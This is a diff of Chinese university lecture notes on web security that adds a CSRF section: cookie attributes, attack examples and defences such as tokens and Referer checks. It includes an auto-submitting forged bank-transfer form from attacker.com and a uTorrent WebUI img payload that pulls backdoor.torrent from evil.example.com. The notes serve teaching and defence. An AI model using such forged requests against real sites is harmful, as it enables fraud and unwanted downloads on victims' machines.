@@ -1,4 +1,4 @@
-#Web安全：注入与XSS
+#Web安全：注入，XSS与CSRF
 
 ###哈尔滨工业大学 网络与信息安全 张宇 2016
 
@@ -94,33 +94,6 @@ Content-type: text/html
 <HTML>
 ...followed by document content...
 ```
-
-[HTTP Cookie](https://en.wikipedia.org/wiki/HTTP_cookie)：Web服务器发送给浏览器，并被浏览器存储的一小片数据；在之后请求中携带cookie，在无状态的HTTP之上实现有状态的会话，例如用cookie存储用户登录信息（authentication cookie），存储购物车中商品，存储曾经访问过的网页（tracking cookie）等等
-
-标准：[RFC6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
-
-- Session cookie：也叫内存cookie或临时cookie，当用户关闭浏览器时，cookie自动被删除
-- Persistent cookie：关闭浏览器后仍被存储的cookie，直到超时，例如用于实现网站一段时间免登录
-- Secure cookie：要求cookie必须通过HTTPS来传递，通过设置Secure标记实现
-- HttpOnly cookie：禁止客户端API和脚本来访问cookie，通过设置HttpOnly标记实现
-- SameSite cookie：Chrome 51中实现`SameSite`标记，只有来自相同站点的请求才能携带cookie
-- Third-party cookie：所浏览网站的cookie，称为'第一方cookie'；所浏览网站中包含的其他网站（例如广告）的cookie，称为'第三方cookie'。通常用于跟踪用户浏览行为，例如A站和B站都包含C站的广告，用户访问A站和B站时，都会被C站设置第三方cookie
-
-HTTP应答中设置cookie的例子：
-
-```http
-HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: theme=light
-Set-Cookie: SID=31d4d96e407aad42; Expires=Wed, 09 Jun 2021 10:18:14 GMT; Secure;
-```
-
-浏览器在随后请求中包含：
-
-```http
-Cookie: SID=31d4d96e407aad42;
-```
-
 
 ###1.2 网页简介
 
@@ -426,6 +399,127 @@ XSS漏洞：当包含有问题URL时，Google会将XSS中常用字符进行转�
 - 禁用脚本，例如在[Go Static or Go Home (ACM Queue 2015)](http://queue.acm.org/detail.cfm?id=2721993)文章指出“In the end, dynamic systems are simply less secure.”
 - Javascript沙箱
 - [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)：显示设置网站资源白名单，例如在HTTP应答头部设置`Content-Security-Policy： default-src ‘self’`，则只允许本站资源
+
+##5. CSRF
+
+[CSRF（Cross-site request forgery）](https://en.wikipedia.org/wiki/Cross-site_request_forgery)：也称为“one-click attack”，“session riding”或缩写为“XSRF”。恶意站点通过用户的浏览器以用户身份向信赖用户的网站发送请求。
+
+- CSRF与XSS不同之处在于，后者利用用户对特定网站的信任，前者利用网站对用户浏览器的信任
+- CSRF是一种针对Web的糊涂副手问题！
+
+###5.0 Cookie
+
+[HTTP Cookie](https://en.wikipedia.org/wiki/HTTP_cookie)：Web服务器发送给浏览器，并被浏览器存储的一小片数据；在之后请求中携带cookie，在无状态的HTTP之上实现有状态的会话，例如用cookie存储用户登录信息（authentication cookie），存储购物车中商品，存储曾经访问过的网页（tracking cookie）等等
+
+标准：[RFC6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
+
+HTTP应答中设置cookie的例子：
+
+```http
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: theme=light
+Set-Cookie: SID=31d4d96e407aad42; Expires=Wed, 09 Jun 2021 10:18:14 GMT; Secure;
+```
+
+浏览器在随后请求中包含：
+
+```http
+Cookie: SID=31d4d96e407aad42;
+```
+
+查看当前网站在Chrome浏览器中的cookie：
+
+Chrome->View->Developer->JavaScript Console->"document.cookie"
+
+Cookie相关术语和概念：
+
+- 临时cookie：也叫内存cookie或，当用户关闭浏览器时，cookie自动被删除
+- 持久cookie：关闭浏览器后仍被存储的cookie，直到超时，例如用于实现网站一段时间免登录
+- 第三方cookie：所浏览网站的cookie，称为'第一方cookie'；所浏览网站中包含的其他网站（例如广告）的cookie，称为'第三方cookie'。通常用于跟踪用户浏览行为，例如A站和B站都包含C站的广告，用户访问A站和B站时，都会被C站设置第三方cookie
+- Secure标记：要求cookie必须通过HTTPS来传递
+- HttpOnly标记：禁止客户端API和脚本来访问cookie
+- SameSite标记：Chrome 51中实现`SameSite`标记，只有来自相同站点的请求才能携带cookie
+- Domain & Path属性：设定cookie的范围，即cookie属于哪个网站（域和路径）。缺省情况下，为所请求的域和路径（例如，"foo.com"和"/"）。
+	- 当设定Domain属性为"foo.com"时，也包括所有子域，例如"docs.foo.com"（除了IE浏览器）
+	- 当未设定Domain属性时，则只包括"foo.com"
+
+###5.1 一个虚构的盗取资金的例子
+
+1. 用户登录到bank.com，浏览器获得认证用的cookie
+- 用户访问一个恶意站点www.attacker.com
+- 浏览器会发送携带用户cookie的请求，将资金转移。
+
+示意图：
+
+```html
+www.attacker.com                          Browser                       wwww.bank.com
+     |                GET /blog HTTP/1.1    |                                      |
+     |<—————————————————————————————————————|                                      |
+     |                                      |                                      |
+ <form action=https://www.bank.com/transfer |                                      |
+  method=POST target=invisibleframe>        |                                      |
+  <input name=recipient value=attacker>     |                                      |
+  <input name=amount value=$100> </form>    |                                      |
+ <script>document.forms[0].submit()</script>|                                      |
+     |————————————————————————————————————> |                                      |
+     |                                      | POST /transfer HTTP/1.1              |
+     |                                      | Referer: http://www.attacker.com/blog|
+     |                                      | Recipient=attacker&amount=$100       |
+     |                                      | Cookie: SessionID=523FA4cd2E         |
+     |                                      |————————————————————————————————————> |
+     |                                      |                                      |
+     |                                      |                 HTTP/1.1 200 OK      |
+     |                                      |<—————————————————————————————————————|
+```
+
+###5.2 uTorrent CSRF漏洞
+ 
+- [uTorrent](https://en.wikipedia.org/wiki/ΜTorrent) 是仅次于迅雷的最流行的BT客户端
+- WebUI是一个插件，允许用户从一台计算机的浏览器上通过网络控制另一台计算机上的uTorrent，可通过`localhost:8080 `访问本机上的WebUI服务
+- [CVE-2008-6586](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6586)：在WebUI 0.315中gui/index.php存在CSRF漏洞，攻击者可以强制下载任意torrent文件，或者更改管理员账号
+
+攻击者将恶意的HTML图片元素注入到论坛或者发送垃圾邮件，例如：
+
+```html
+<img src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent">
+```
+
+当浏览器访问这些网页时就会自动打开链接，向uTorrent的WebUI发送携带cookie的请求。
+
+###5.3 Login CSRF 
+
+参考资料：[Robust Defenses for Cross-Site Request Forgery (ACM CCS 2008)](http://www.adambarth.com/papers/2008/barth-jackson-mitchell-b.pdf)
+
+在Login CSRF中，攻击者使用受害者浏览器来伪造一个指向目标网站登录页面的请求，携带攻击者的用户名和密码；受害者会以攻击者的身份登录到目标网站上，而浏览器中存储攻击者登录的cookie。
+
+- 窃取搜索历史：受害者受到Login CSRF攻击，以攻击者身份登录Yahoo!或Google；以攻击者身份使用搜索引擎，搜索历史被记录在攻击者账户里
+- PayPal：攻击者创建一个使用PayPal付款的恶意商家网站；受害者购买商品时被重定向到PayPal来登录账号；商家偷偷地让受害者登录到攻击者的账户；为了付款，受害者把信用卡信息录入了攻击者的账户
+- iGoogle：iGoogle允许用户定制Google主页上的小插件；攻击者制作一个恶意插件并安装到自己的iGoogle主页；受害者以攻击者身份登录到攻击者的iGoogle主页，并运行恶意插件；该插件以`https://www.google.com`为源来运行，可以盗取受害者的口令
+- [OpenID](https://en.wikipedia.org/wiki/OpenID)是一个开放认证平台，用户（User）可以从一个OpenID提供商（IDP）获得一个数字身份（ID），来登录支持OpenID的网站（RP，Relying Party）。由于缺乏将OpenID会话与用户浏览器绑定的机制，攻击者可以令用户浏览器已攻击者身份来初始化一个会话。
+	1. 攻击者首先访问一个RP，并启动与IDP的认证过程
+	- 在OpenID协议最后一步，IDP将攻击者浏览器重定向到RP的`return_to` URL
+	- 但攻击者并不访问，而是令用户的浏览器来访问`return_to` URL
+	- RP完成OpenID协议，在用户的浏览器中存储会话cookie，用户已经作为攻击者登录了RP
+
+
+###5.4 防御
+
+- Secret Validation Token：由服务器生成一个随机token发送给浏览器，后续请求需携带token；没有该token的伪造请求不能得到应答
+	- Token必须保证不能为预测或伪造，例如令Token=MAC(server-key, session-ID)
+	- Sychronizer token pattern：将token嵌入在网页里，例如`<input type="hidden" name="csrftoken" value="KbyUmhTLMpYj7CD2" />`
+	- Cookie-to-Header token：将token放入cookie `Csrf-token`中，浏览器用JS读取token并在请求时携带`X-Csrf-Token`头部，但这与HttpOnly冲突
+	- 缺点：攻击者若能获取token，则可以伪装为用户
+- Referer Validation：当浏览器发出请求时，携带发出请求网页的URL，来区分是同站请求还是跨站请求
+	- HTTP头部[`Referer`](https://en.wikipedia.org/wiki/HTTP_referer)
+	- HTTP头部[`Origin`](https://people-mozilla.org/~bsterne/content-security-policy/origin-header-proposal.html)
+	- 定制头部`X-Requested-With`（RoR和Django）
+	- AJAX中的[`XMLHttpRequest`](https://en.wikipedia.org/wiki/XMLHttpRequest)
+	- 缺点：referer头部可能会泄露用户隐私
+- 客户端保护：浏览器来阻止跨站点请求，例如FireFox和Chrome的uMatrix，
+	- 缺点：也会干扰正常跨站请求
+- 额外验证：[CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA)或者重新输入口令
+	- 缺点：会令用户不方便
 
 ---
 
